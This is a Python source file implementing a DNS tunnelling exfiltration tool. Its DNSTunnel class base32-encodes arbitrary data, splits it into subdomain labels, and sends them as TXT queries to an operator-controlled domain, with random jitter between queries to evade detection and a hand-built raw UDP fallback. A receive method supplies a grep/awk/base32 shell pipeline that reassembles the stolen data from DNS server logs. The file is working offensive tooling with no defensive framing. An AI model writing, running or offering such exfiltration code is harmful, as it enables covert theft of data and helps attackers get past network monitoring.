import base64, time, random, struct, socket

class DNSTunnel:
    def __init__(self, domain: str, dns_server: str = "8.8.8.8"):
        self.domain = domain
        self.dns_server = dns_server

    def _encode_chunk(self, data: bytes, chunk_size: int = 32) -> list:
        encoded = base64.b32encode(data).decode().rstrip("=")
        return [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]

    def exfil(self, data: str, chunk_size: int = 32, jitter: tuple = (0.5, 2.0)) -> dict:
        raw = data.encode()
        chunks = self._encode_chunk(raw, chunk_size)
        results = []
        for i, chunk in enumerate(chunks):
            subdomain = f"{chunk}.{i}.{self.domain}"
            try:
                import dns.resolver
                dns.resolver.resolve(subdomain, 'TXT')
                results.append({"seq": i, "subdomain": subdomain, "sent": True})
            except Exception:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(3)
                try:
                    query = self._build_dns_query(subdomain)
                    s.sendto(query, (self.dns_server, 53))
                    s.recvfrom(512)
                    results.append({"seq": i, "subdomain": subdomain, "sent": True})
                except Exception as e:
                    results.append({"seq": i, "subdomain": subdomain, "sent": False, "error": str(e)})
                finally:
                    s.close()
            if i < len(chunks) - 1:
                time.sleep(random.uniform(*jitter))
        return {
            "method": "dns_tunnel",
            "domain": self.domain,
            "total_chunks": len(chunks),
            "sent": sum(1 for r in results if r["sent"]),
            "failed": sum(1 for r in results if not r["sent"]),
            "results": results,
        }

    def _build_dns_query(self, qname: str) -> bytes:
        header = struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
        question = b""
        for label in qname.split("."):
            question += bytes([len(label)]) + label.encode()
        question += b"\x00" + struct.pack("!HH", 16, 1)
        return header + question

    def receive(self, log_file: str = "/var/log/dns_queries.log") -> dict:
        return {
            "method": "dns_tunnel_receive",
            "note": "requires DNS server log access",
            "log_file": log_file,
            "decode_command": f"grep '{self.domain}' {log_file} | awk '{{print $7}}' | sort -t. -k2 -n | cut -d. -f1 | tr -d '.' | base32 -d",
        }
